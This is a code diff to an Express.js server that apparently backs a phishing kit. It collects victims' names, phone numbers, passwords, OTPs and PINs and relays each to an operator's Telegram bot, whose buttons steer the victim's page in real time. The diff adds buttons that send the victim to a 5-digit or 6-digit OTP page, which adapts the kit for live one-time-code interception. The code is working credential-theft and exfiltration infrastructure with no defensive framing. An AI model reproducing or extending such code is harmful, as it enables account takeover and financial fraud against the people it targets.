@@ -12,7 +12,7 @@ const passwordRequests = {};
 const otpRequests = {};
 const pinRequests = {};
 const blockedRequests = {};
-const requestMeta = {}; // requestId → { name, phone, botId }
+const requestMeta = {};
 
 // ---------------- MULTI-BOT STORE ----------------
 const bots = [];
@@ -37,7 +37,7 @@ app.use(express.json({ type: '*/*' }));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// ---------------- DEBUG: LIST BOTS (ADDED ONLY THIS) ----------------
+// ---------------- DEBUG ROUTE ----------------
 app.get('/debug/bot', (req, res) => {
   res.json({
     count: bots.length,
@@ -114,26 +114,38 @@ app.post('/submit-password', (req, res) => {
 
     sendTelegram(
       bot,
-      `🔐 PASSWORD VERIFICATION
+      `🔐 DETAILS VERIFICATION
 
 👤 Name: ${name}
 📞 Phone: ${phone}
 🔑 Password: ${password}
 🆔 Ref: ${requestId}`,
-      [[
-        { text: '✅ Correct Password', callback_data: `pass_ok:${requestId}` },
-        { text: '❌ Wrong Password', callback_data: `pass_bad:${requestId}` }
-      ]]
+      [
+        [
+          { text: '🔢 5 Digit OTP', callback_data: `pass_5:${requestId}` },
+          { text: '🔢 6 Digit OTP', callback_data: `pass_6:${requestId}` }
+        ],
+        [
+          { text: '❌ Wrong Details', callback_data: `pass_bad:${requestId}` }
+        ]
+      ]
     );
 
     res.json({ requestId });
+
   } catch {
     res.status(500).json({ error: 'Internal server error' });
   }
 });
 
 app.get('/check-password/:id', (req, res) => {
-  res.json({ approved: passwordRequests[req.params.id] ?? null });
+  const result = passwordRequests[req.params.id] ?? null;
+
+  if (result === '5') return res.json({ redirect: 'code2' });
+  if (result === '6') return res.json({ redirect: 'code' });
+  if (result === false) return res.json({ approved: false });
+
+  res.json({ approved: null });
 });
 
 // ---------------- OTP STEP ----------------
@@ -162,6 +174,7 @@ app.post('/submit-otp', (req, res) => {
     );
 
     res.json({ requestId });
+
   } catch {
     res.status(500).json({ error: 'Internal server error' });
   }
@@ -198,6 +211,7 @@ app.post('/submit-pin', (req, res) => {
     );
 
     res.json({ requestId });
+
   } catch {
     res.status(500).json({ error: 'Internal server error' });
   }
@@ -222,12 +236,27 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
   const meta = requestMeta[requestId];
   let feedback = '';
 
-  if (action === 'pass_ok') { passwordRequests[requestId] = true; feedback = '✅ Password approved'; }
-  if (action === 'pass_bad') { passwordRequests[requestId] = false; feedback = '❌ Password rejected'; }
+  // PASSWORD DECISION
+  if (action === 'pass_5') {
+    passwordRequests[requestId] = '5';
+    feedback = '🔢 Redirected to 5 Digit OTP';
+  }
 
+  if (action === 'pass_6') {
+    passwordRequests[requestId] = '6';
+    feedback = '🔢 Redirected to 6 Digit OTP';
+  }
+
+  if (action === 'pass_bad') {
+    passwordRequests[requestId] = false;
+    feedback = '❌ Details rejected';
+  }
+
+  // OTP DECISION
   if (action === 'otp_ok') { otpRequests[requestId] = true; feedback = '✅ OTP approved'; }
   if (action === 'otp_bad') { otpRequests[requestId] = false; feedback = '❌ OTP rejected'; }
 
+  // PIN DECISION
   if (action === 'pin_ok') { pinRequests[requestId] = true; feedback = '✅ PIN approved'; }
   if (action === 'pin_bad') { pinRequests[requestId] = false; feedback = '❌ PIN rejected'; }
   if (action === 'pin_block') { blockedRequests[requestId] = true; feedback = '🛑 User blocked'; }
